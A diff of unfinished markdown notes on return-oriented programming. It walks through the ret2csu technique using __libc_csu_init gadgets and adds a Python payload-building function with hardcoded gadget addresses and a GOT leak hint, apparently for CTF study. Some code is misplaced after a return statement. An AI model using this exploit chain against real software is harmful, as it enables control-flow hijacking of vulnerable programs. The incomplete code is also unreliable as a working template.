@@ -125,15 +125,25 @@ ROP
 
 		payload += p64(syscall)				
 
+
+
+
+
+
+
+
+
+
 ```
 
-
-# ret2csu(no sufficient gadgets to set rdi,rsi,rdx can be found)   not finished/ in progress
+# ret2csu(no sufficient gadgets to set rdi,rsi,rdx can be found   not finished/ in progress
 ```
 		the `__libc_csu_init` function is responsible to initialize libc files.
 		in this function there are some interesting gadgets we can use.
 
 		first gadget let us controll some registers with pop
+		POPGADGET:
+
 		```
      		__libc_csu_init+90	POP        RBX
         	__libc_csu_init+91	POP        RBP
@@ -143,9 +153,9 @@ ROP
 	        __libc_csu_init+98 	POP        R15
         	__libc_csu_init+100 	RET
 		```
-
+		rbx,rbp,r12,r13,r14,r15
 		and this will let us controll rdx,rsi and edi but we need to meet some conditions 
-		
+		CALLGADGET:
 		```                	 
         	__libc_csu_init+64	MOV        RDX,R14
         	__libc_csu_init+67 	MOV        RSI,R13
@@ -163,13 +173,91 @@ ROP
 	        __libc_csu_init+98 	POP        R15
         	__libc_csu_init+100 	RET
 		```
+		there ase some constrains in the caller gadget 
+		# 1.
+		we want to pass the JNE and dont take it.
+		```
+		rbx = 0x00 set to 0 since it will be incremented later
+		rbp = set to 1 so when compared to the incremented rbx 
+		```
+			```
+			__libc_csu_init+77	ADD        RBX,0x1
+        	__libc_csu_init+81	CMP        RBP,RBX
+        	__libc_csu_init+84	JNE        __libc_csu_init+64
+       	 	
+       		```
+        # 2
+        we want to set r15 = to a valide function 
 
-		rbx,rbp,r12,r13,r14,r15
 
-		rdx = r14
-		rsi = r13
-		edi = r12D
-		rip = [r15 + rbx*8] #we use this to syscall
+
+
+
+
+   	```
+	putsgot = elf.got['puts']          
+    putsplt = elf.plt['puts']
+    pop_rdi = 0x00000000004011f3
+    pop_rsi_r15 = 0x00000000004011f1
+    ret = 0x4004e6
+
+	def ret2csu(call,rdi,rsi,rdx):
+        payload = p64(0x4011ea)         # first call popper gadget
+
+        payload += p64(0x00)            # pop rbx - set to 0 since it will be incremented later
+        payload += p64(0x01)            # pop rbp - set to 1 so when compared to the incremented rbx 
+        payload += p64(0x400000)       # pop r12 #edi only 4 bytes controll
+        payload += p64(rsi)            # pop r13 #rsi
+        payload += p64(rdx)            # pop r14 #rdx
+        payload += p64(putsgot)            # pop r15 
+
+        payload += p64(0x4011d0)        # 2nd call caller gadget
+
+            #__libc_csu_init+64     MOV        RDX,R14
+            #__libc_csu_init+67     MOV        RSI,R13
+            #__libc_csu_init+70     MOV        EDI,R12D
+
+        payload += p64(0x00)            # add rsp,0x8 padding cause __libc_csu_init+86  ADD RSP,0x8 
+
+
+            #__libc_csu_init+90     POP        RBX
+            #__libc_csu_init+91     POP        RBP
+            #__libc_csu_init+92     POP        R12
+            #__libc_csu_init+94     POP        R13
+            #__libc_csu_init+96     POP        R14
+            #__libc_csu_init+98     POP        R15
+            #__libc_csu_init+100    RET
+
+        payload += p64(0x00)            # rbx
+        payload += p64(0x00)            # rbp
+        payload += p64(0x00)            # r12
+        payload += p64(0x00)            # r13
+        payload += p64(0x00)            # r14
+        payload += p64(0x00)            # r15
+
+            #__libc_csu_init+100    RET
+
+        payload += p64(pop_rdi)        
+        payload += p64(rdi)             # update rdi with correct unconstrained content
+        payload += p64(pop_rsi_r15)     
+        payload += p64(rsi)             # update rsi with correct unconstrained content
+        payload += p64(0x00)
+
+            #we now have this registers under controll rdi,rsi,rdx,rbx,rbp,r12,r13,r14,r15
+
+        payload += p64(call)            # actual wanted function call
+        return payload
+
+        rop = b'A'*16
+        rop += ret2csu(putsplt, 0x7ffff7f735aa, 0x00, 0x00) # call(rdi,rsi,rdx)
+
+
+	```
+
+For de-randomizing libc, we can use &GOT_TABLE, coupled with some read(), write() or send(), recv() (ie: usually available in CTF challenges)
+
+
+
 ```
 <img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2csu_gadgets.png">
 
